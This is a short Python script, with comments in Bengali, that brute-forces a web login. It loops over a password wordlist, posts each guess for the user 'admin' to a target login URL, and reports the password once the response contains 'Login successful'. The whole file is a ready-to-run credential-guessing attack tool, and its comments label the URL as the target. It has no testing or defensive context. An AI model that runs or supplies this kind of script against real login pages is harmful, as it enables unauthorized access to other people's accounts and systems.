import requests

def brute_force_login(url, username, password_list):
    with open(password_list, 'r') as file:
        for password in file:
            password = password.strip()
            data = {'username': username, 'password': password}
            
            # এখানে POST রিকোয়েস্ট পাঠাচ্ছে
            response = requests.post(url, data=data)
            
            # সফল লগইন এর প্রতিক্রিয়া চেক করা
            if "Login successful" in response.text:
                print(f"Password found: {password}")
                return True
            else:
                print(f"Tried password: {password} - Failed")
    
    print("Password not found.")
    return False

# ব্যবহার করার সময় সঠিক URL এবং ফাইলের নাম দিন
if __name__ == "__main__":
    url = "http://example.com/login"  # টার্গেট URL
    username = "admin"  # যে ইউজারনেম দিয়ে brute-force চালাবেন
    password_list = "passwords.txt"  # পাসওয়ার্ড ওয়ার্ডলিস্ট
    
    brute_force_login(url, username, password_list)